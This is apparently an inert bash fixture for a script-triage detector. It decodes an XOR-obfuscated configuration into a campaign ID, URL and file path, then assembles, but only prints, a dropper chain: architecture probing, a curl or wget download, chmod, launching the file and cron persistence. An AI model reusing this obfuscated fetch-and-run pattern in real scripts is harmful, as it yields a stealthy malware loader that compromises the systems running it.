#!/usr/bin/env bash

# Huntress Script Triage -- inert static-analysis fixture (bash_linux)

readonly Material_90400b81='222:227:210:174:221:169:204:188:207:242:130:240:159:249:144:252:153:198:174:193:178:198:234:139:232:153:236:133:247:146:205:191:218:183:216:172:201:229:146:224:137:253:152:199:161:200:164:193:237:142:230:135:233:142:235:180:217:182:210:183:155:255:150:229:149:244:128:227:139:212:164:214:185:218:191:204:191:195:162:198:167:215:163:198:180:137:254:153:252:136:215:182:196:167:207:144:246:151:251:151:245:148:247:156:224:147:231:134:225:132:219:184:215:162:204:184:133:176:204:175:206:163:211:178:219:188:210:141:228:128:189:222:191:210:162:195:170:205:163:142:236:223:238:141:189:138:233:143:234:136:244:129:243:159:162:202:190:202:186:201:243:220:243:145:162:147:240:192:247:148:242:151:245:219:190:198:167:202:186:214:179:157:244:154:236:141:225:136:236:195:240:201:168:158:166:145:168:204:226:145:249:133:240:131:230:148:203:170:205:168:198:178:143:199:178:220:168:218:191:204:191:243:146:240:223:189:142:191:220:236:219:184:222:187:217:165:195:170:198:163:252:140:237:153:241:204:227:151:250:138:165:205:184:214:162:208:181:198:181:152:251:154:249:145:244:219:245:134:242:147:244:145:188:222:237:220:191:143:184:219:189:216:186:198:167:213:182:222:129:241:131:236:142:235:214:163:205:172:193:164:137:228:152:235:142:252:138:227:128:229:186:212:181:216:189:128:245:133:225:128:244:145:188:222:237:220:191:143:184:219:189:216:186:148:231:130:240:134:239:140:233:149:246:132:235:133:218:170:203:191:215:234:197:160:212:183:152:251:137:230:136:166:194:237:152:232:140:237:153:252:209:179:128:177:210:226:213:182:208:181:215'

readonly Codec_90400b81='decimal_colon|rolling_xor|a8'



Load_90400b81() {

  stored_bytes=()

  local IFS=':'

  read -r -a stored_bytes <<< "${Material_90400b81}"

}



Decode_90400b81() {

  recovered_bytes=()

  local prior_byte=168

  local byte_index

  for ((byte_index=0; byte_index<${#stored_bytes[@]}; byte_index++)); do

    recovered_bytes+=("$((stored_bytes[byte_index] ^ prior_byte))")

    prior_byte=${stored_bytes[byte_index]}

  done

}



Recover_90400b81() {

  local -a stored_bytes recovered_bytes

  local configuration_text harmless_value decode_pass byte_index

  if ((2 > 1)); then harmless_value=left; else harmless_value=right; fi

  Load_90400b81

  if ! Decode_90400b81; then return 71; fi

  configuration_text=''

  local octal character

  for byte_index in "${!recovered_bytes[@]}"; do

    printf -v octal '%03o' "${recovered_bytes[byte_index]}"

    printf -v character '%b' "\\$octal"

    configuration_text+="$character"

  done

  printf '%s\n' "$configuration_text"

}



Inspect_90400b81() { local recovered; recovered="$(Recover_90400b81)"; printf '%s\n' "$recovered"; }



Plan_90400b81() {

  local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''

  descriptor="$(Inspect_90400b81)"

  local -a fields

  IFS='|' read -r -a fields <<< "$descriptor"

  for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done

  local -a profile_command=(uname -m) request_primary=(curl --fail --silent --show-error -o "$file_path" "$url") request_fallback=(wget -qO "$file_path" "$url") permission_command=(chmod 0700 "$file_path") launch_command=("$file_path") cron_descriptor=(printf '%s' "$cron_path" "$service_name")

  declare -p profile_command request_primary request_fallback permission_command launch_command cron_descriptor

}



if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_90400b81; fi

